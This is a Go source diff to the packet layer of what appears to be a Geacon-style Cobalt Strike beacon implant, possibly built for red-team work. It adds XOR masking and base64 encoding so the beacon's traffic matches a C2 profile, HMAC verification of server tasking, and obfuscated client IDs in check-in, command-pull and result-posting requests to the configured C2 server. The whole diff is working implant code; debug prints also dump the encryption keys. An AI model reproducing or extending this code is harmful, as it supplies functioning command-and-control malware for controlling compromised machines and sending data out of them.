@@ -3,6 +3,7 @@ package packet
 import (
 	"bytes"
 	"crypto/sha256"
+	"crypto/hmac"
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
@@ -13,6 +14,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"math/rand"
 
 	"github.com/imroc/req"
 )
@@ -37,30 +39,96 @@ func ReadInt(b []byte) uint32 {
 	return binary.BigEndian.Uint32(b)
 }
 
-func DecryptPacket(b []byte) []byte {
-	decrypted, err := crypt.AesCBCDecrypt(b, config.AesKey)
+func DecryptPacket(b []byte) ([]byte, bool) {
+	// hmacHash := b[len(b)-crypt.HmacHashLen:]
+	// fmt.Printf("hmac hash: %v\n", hmacHash)
+	// //TODO check the hmachash
+	// restBytes := b[:len(b)-crypt.HmacHashLen]
+	// fmt.Printf("Length of restBytes: %d\n", len(restBytes))
+
+	hmacVerfied := false
+
+	// first base64decode, then unmask
+	xored := make([]byte, base64.URLEncoding.WithPadding(base64.NoPadding).DecodedLen(len(b)))
+	_, err := base64.URLEncoding.WithPadding(base64.NoPadding).Decode(xored, b)
 	if err != nil {
-		panic(err)
+		fmt.Println("decode error:", err)
 	}
-	return decrypted
+	// xored, err := base64.URLEncoding.DecodeString(string(b))
+	fmt.Printf("Length of xored data: %d\n", len(xored))
+	fmt.Printf("xored data: %v\n", xored)
+
+	decrypted := unmask(xored)
+
+	fmt.Printf("Length of decoded data: %d\n", len(decrypted))
+	fmt.Printf("%v\n", decrypted)
+
+	// if the data length is greater than 0, then we received a command!
+	// Otherwise, it is just an acceptance of our checkin request, and as such does not contain a command nor an HMAC
+	if len(decrypted) > 0 {
+			// last 16 Bytes are the HMAC 
+		// hmacHash := decrypted[:len(decrypted)-crypt.HmacHashLen]
+		hmacHash := decrypted[len(decrypted)-crypt.HmacHashLen:]
+
+		fmt.Printf("hmac hash: %v\n", hmacHash)
+		// restBytes := decrypted[len(decrypted)-crypt.HmacHashLen:]
+		restBytes := decrypted[:len(decrypted)-crypt.HmacHashLen]
+		fmt.Printf("%v\n", restBytes)
+
+		//TODO check the hmachash
+		if validMac(restBytes, hmacHash, config.HmacKey) == true {
+			fmt.Printf("HMAC correct\n")
+			hmacVerfied = true
+		} else {
+			fmt.Printf("HMAC incorrect\n")
+		}
+
+		aesDecrypted, err := crypt.AesCBCDecrypt(restBytes, config.AesKey)
+
+		if err != nil {
+			panic(err)
+		}
+
+		return aesDecrypted, hmacVerfied
+	} else {
+		fmt.Printf("decrypted length is zero\n")
+		return nil, hmacVerfied
+	}
 }
 
-func EncryptPacket() {
+func validMac(message, messageMAC, key []byte) bool {
+	mac := hmac.New(sha256.New, key)
+	mac.Write(message)
+	expectedMAC := mac.Sum(nil)[0:16]
+	fmt.Printf("Expected HMAC: %v\n Message HMAC: %v\n", expectedMAC, messageMAC)
+	fmt.Printf("HMAC Key: %v\n", config.HmacKey)
+	return hmac.Equal(messageMAC, expectedMAC)
+}
 
+func EncryptPacket(b []byte) []byte {
+	fmt.Printf("Packet before encryption:\n %v \n", b)
+	masked := mask(b)
+	encrypted := make([]byte, base64.URLEncoding.WithPadding(base64.NoPadding).EncodedLen(len(masked)))
+	base64.URLEncoding.WithPadding(base64.NoPadding).Encode(encrypted, masked)
+	fmt.Printf("Packet after encryption:\n %s \n", string(encrypted))
+	return encrypted
 }
 
 func ParsePacket(buf *bytes.Buffer, totalLen *uint32) (uint32, []byte) {
+	fmt.Printf("Reading Command Type Bytes...\n")
 	commandTypeBytes := make([]byte, 4)
 	_, err := buf.Read(commandTypeBytes)
 	if err != nil {
 		panic(err)
 	}
 	commandType := binary.BigEndian.Uint32(commandTypeBytes)
+	fmt.Printf("Reading Command Len Bytes...\n")
 	commandLenBytes := make([]byte, 4)
 	_, err = buf.Read(commandLenBytes)
 	if err != nil {
 		panic(err)
 	}
+	fmt.Printf("Reading Command Bytes...\n")
 	commandLen := ReadInt(commandLenBytes)
 	commandBuf := make([]byte, commandLen)
 	_, err = buf.Read(commandBuf)
@@ -109,7 +177,7 @@ func MakePacket(replyType int, b []byte) []byte {
 	hmacHashBytes := crypt.HmacHash(encrypted)
 	buf.Write(hmacHashBytes)
 
-	return buf.Bytes()
+	return EncryptPacket(buf.Bytes())
 
 }
 
@@ -121,8 +189,8 @@ func EncryptedMetaInfo() string {
 	}
 
 	//TODO c2profile encode method
-	finalPakcet := base64.StdEncoding.EncodeToString(packetEncrypted)
-	return finalPakcet
+	finalPacket := string(EncryptPacket(packetEncrypted))
+	return finalPacket
 }
 
 /*
@@ -136,6 +204,8 @@ func MakeMetaInfo() []byte {
 	sha256hash := sha256.Sum256(config.GlobalKey)
 	config.AesKey = sha256hash[:16]
 	config.HmacKey = sha256hash[16:]
+	fmt.Printf("AES KEY: %v\n", config.AesKey)
+	fmt.Printf("HMAC KEY: %v\n", config.HmacKey)
 
 	clientID = sysinfo.GeaconID()
 	processID := sysinfo.GetPID()
@@ -221,6 +291,7 @@ func FirstBlood() bool {
 		resp := HttpGet(config.GetUrl, encryptedMetaInfo)
 		if resp != nil {
 			fmt.Printf("firstblood: %v\n", resp)
+			fmt.Printf("firstblood body: %x\n", resp.Bytes())
 			break
 		}
 		time.Sleep(500 * time.Millisecond)
@@ -230,13 +301,18 @@ func FirstBlood() bool {
 }
 
 func PullCommand() *req.Resp {
+	fmt.Printf("PullCommand encryptedMetaInfo: %x \n", encryptedMetaInfo)
 	resp := HttpGet(config.GetUrl, encryptedMetaInfo)
 	fmt.Printf("pullcommand: %v\n", resp.Request().URL)
+	fmt.Printf("%v \n", resp)
 	return resp
 }
 
 func PushResult(b []byte) *req.Resp {
-	url := config.PostUrl + strconv.Itoa(clientID)
+	// url := config.PostUrl + strconv.Itoa(clientID)
+	maskedClientID := mask([]byte(strconv.Itoa(clientID)))
+	base64ClientID := base64.URLEncoding.WithPadding(base64.NoPadding).EncodeToString(maskedClientID)
+	url := config.PostUrl + string(base64ClientID) + "RGVsb2l0dGUgQzIK"
 	resp := HttpPost(url, b)
 	fmt.Printf("pushresult: %v\n", resp.Request().URL)
 	return resp
@@ -253,3 +329,46 @@ func processError(err string) {
 	PushResult(finalPaket)
 }
 */
+
+func mask(b []byte) []byte {
+	key := make([]byte, 4)
+    rand.Read(key)
+	data := make([]byte, len(b))
+	// fmt.Printf("Length of key is %d \nLength of data is %d \n", len(key), len(b))
+
+	for i := 0; i < len(b); i++ {
+		xorPos := i % len(key)
+		// fmt.Printf("i IS: %d \nXOR POSITION IS: %d %% %d = %d \n", i, i, len(key), xorPos)
+		xorKey := key[xorPos]
+		data[i] = b[i] ^ xorKey
+		// fmt.Printf("Data before encoding: %v \nData after encoding: %v \n", b[i], data[i])
+	}
+
+	// fmt.Printf("Data masked: %x \n", data)
+
+	result := make([]byte, len(key) + len(data))
+	result = append(key, data...)
+	return result
+}
+
+func unmask(b []byte) []byte {
+	fmt.Printf("Data to unmask: %v \n", b)
+	// CS mask directive prepends 4 bytes of random data as a XOR key to the encoded data. To get the data as we want it, we need to decode it.
+	// first 4 bytes of data are our key, rest is the data
+	fmt.Printf("Length of b   : %d\nLength of key : %d\nLength of data: %d\n", len(b), len(b[:4]), len(b[4:]))
+	key := b[:4]
+	data := b[4:]
+	// XOR the data with the key
+	result := make([]byte, len(data)) // create a new slice with the same length as our data (original byte slice length - key length)
+
+	// fmt.Printf("Length of data is %d\n", len(data))
+
+	for i := 0; i < len(data); i++ {
+		xorPos := i % len(key)
+		// fmt.Printf("i IS: %d \nXOR POSITION IS: %d %% %d = %d \n", i, i, len(key), xorPos)
+		xorKey := key[xorPos]
+		result[i] = data[i] ^ xorKey
+		// fmt.Printf("Data before encoding: %v \nData after encoding: %v \n", data[i], result[i])
+	}
+	return result
+}
